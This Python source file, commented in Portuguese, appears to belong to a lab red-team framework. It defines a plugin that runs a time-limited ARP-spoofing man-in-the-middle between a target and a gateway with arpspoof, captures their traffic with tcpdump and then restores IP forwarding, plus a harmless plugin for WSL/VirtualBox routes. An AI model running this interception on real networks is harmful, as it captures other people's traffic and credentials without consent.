"""Operações explícitas de laboratório com estado e limpeza delimitados."""
import ipaddress
import json
import os
import socket
import time
from pathlib import Path
from plugins.base import BasePlugin
from core.attack import mapping
from core.operations import Process, Unavailable, command
from core.validation import positive

FORWARDING = Path("/proc/sys/net/ipv4/ip_forward")


def interface(value):
    if value not in {name for _, name in socket.if_nameindex()}:
        raise ValueError(f"Interface indisponível: {value}")
    return value


def require_root():
    if os.geteuid() != 0:
        raise Unavailable("Esta operação exige privilégios de root")


def network_args(parser):
    parser.add_argument("--interface", required=True)
    parser.add_argument("--duration", type=positive, default=30)


def wait_processes(processes, duration):
    if duration > 3600:
        raise ValueError("Duração máxima: 3600 segundos")
    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        for process in processes:
            if process.process.poll() is not None:
                _, stderr, code = process.collect(check=False)
                raise RuntimeError(f"Backend encerrou antes do prazo ({code}): {stderr[:1000]}")
        time.sleep(min(0.1, max(0, deadline - time.monotonic())))


class ARPMitmLab(BasePlugin):
    PLUGIN_ID = "arp_mitm_lab"
    ALIASES = ("ops:801",)
    NAME = "ARP MITM de laboratório"
    DESCRIPTION = "Sessão delimitada por interface, dois alvos e duração; restaura forwarding."
    GROUP = "Red"
    TACTIC = "TA0006"
    ATTACK = (mapping("T1557.002"), mapping("T1040"))
    DEPENDENCIES = (("executable", "arpspoof"), ("executable", "tcpdump"))

    def add_arguments(self, parser):
        network_args(parser)
        parser.add_argument("--target", type=ipaddress.IPv4Address, required=True)
        parser.add_argument("--gateway", type=ipaddress.IPv4Address, required=True)

    def execute(self, p, ctx):
        require_root()
        iface = interface(p["interface"])
        if p["target"] == p["gateway"] or p["duration"] > 3600:
            raise ValueError("Alvos devem diferir e duração deve ser <= 3600")
        original = FORWARDING.read_text().strip()
        ctx.artifact("initial-state.json", json.dumps({"forwarding": original, "interface": iface}))
        processes = []
        try:
            FORWARDING.write_text("1\n")
            capture = ctx.artifact("capture.pcap", b"")
            processes.append(Process(["tcpdump", "-U", "-i", iface, "-w", str(capture),
                                      "host", str(p["target"]), "and", "host", str(p["gateway"])]))
            processes.append(Process(["arpspoof", "-i", iface, "-t", str(p["target"]), str(p["gateway"])]))
            processes.append(Process(["arpspoof", "-i", iface, "-t", str(p["gateway"]), str(p["target"])]))
            wait_processes(processes, p["duration"])
            ctx.finding(operation="arp_mitm", duration=p["duration"], capture=str(capture))
        finally:
            for process in reversed(processes):
                try:
                    process.stop()
                    process.collect(check=False)
                except Exception as exc:
                    ctx.error(f"Falha ao encerrar processo: {exc}")
            try:
                FORWARDING.write_text(original + "\n")
                ctx.finding(restored_forwarding=original)
            except OSError as exc:
                ctx.error(f"Falha ao restaurar forwarding; veja initial-state.json: {exc}")


class WSLRoutes(BasePlugin):
    PLUGIN_ID = "wsl_vbox_routes"
    ALIASES = ("ops:003",)
    NAME = "Rotas WSL/VirtualBox"
    DESCRIPTION = "Planeja, aplica e reverte rotas locais; Windows permanece manual."
    GROUP = "Misc"
    TACTIC = "Utilities"
    DEPENDENCIES = (("executable", "ip"),)

    def add_arguments(self, parser):
        parser.add_argument("--operation", choices=("plan", "apply", "revert"), default="plan")
        parser.add_argument("--interface")
        parser.add_argument("--gateway", type=ipaddress.IPv4Address)
        parser.add_argument("--network", action="append", type=ipaddress.IPv4Network, default=[])
        parser.add_argument("--state-file", type=Path)

    def execute(self, p, ctx):
        if p["operation"] == "revert":
            require_root()
            if not p.get("state_file"):
                raise ValueError("--state-file obrigatório para revert")
            state = json.loads(p["state_file"].read_text())
            self.restore(state, ctx)
            return
        if not p.get("interface") or not p.get("gateway") or not p["network"]:
            raise ValueError("Informe --interface, --gateway e pelo menos uma --network")
        iface = interface(p["interface"])
        routes = [{"network": str(net), "gateway": str(p["gateway"]), "interface": iface} for net in p["network"]]
        for route in routes:
            ctx.finding(operation="route_plan", **route)
        ctx.finding(windows="Execute route print no Windows e configure a rota com o gateway alcançável do lado Windows; o gateway Linux não é presumido como gateway Windows.")
        if p["operation"] == "plan":
            return
        require_root()
        raw, _, _ = command(["ip", "-json", "route", "show"])
        existing = json.loads(raw)
        if any(item.get("dst") == r["network"] for item in existing for r in routes):
            raise ValueError("Já existe rota para um dos destinos; nenhuma rota será substituída")
        state = {"forwarding": FORWARDING.read_text().strip(), "routes": []}
        state_path = ctx.artifact("route-state.json", json.dumps(state))
        try:
            FORWARDING.write_text("1\n")
            for route in routes:
                command(["ip", "route", "add", route["network"], "via", route["gateway"], "dev", route["interface"]])
                state["routes"].append(route)
                state_path.write_text(json.dumps(state, indent=2))
            ctx.finding(operation="applied", revert_state=str(state_path.resolve()))
        except BaseException:
            self.restore(state, ctx)
            raise

    @staticmethod
    def restore(state, ctx):
        if state.get("forwarding") not in ("0", "1") or not isinstance(state.get("routes"), list):
            raise ValueError("Estado de restauração inválido")
        validated = [(str(ipaddress.IPv4Network(r["network"])), str(ipaddress.IPv4Address(r["gateway"])), interface(r["interface"])) for r in state["routes"]]
        raw, _, _ = command(["ip", "-json", "route", "show"])
        existing = json.loads(raw)
        for network, gateway, iface in reversed(validated):
            matching = any(r.get("dst") == network and r.get("gateway") == gateway and r.get("dev") == iface for r in existing)
            if matching:
                try:
                    command(["ip", "route", "del", network, "via", gateway, "dev", iface])
                    ctx.finding(operation="route_removed", network=network)
                except Exception as exc:
                    ctx.error(f"Não foi possível remover {network}: {exc}")
        if FORWARDING.read_text().strip() == "1":
            FORWARDING.write_text(state["forwarding"] + "\n")
        ctx.finding(operation="restored", forwarding=FORWARDING.read_text().strip())
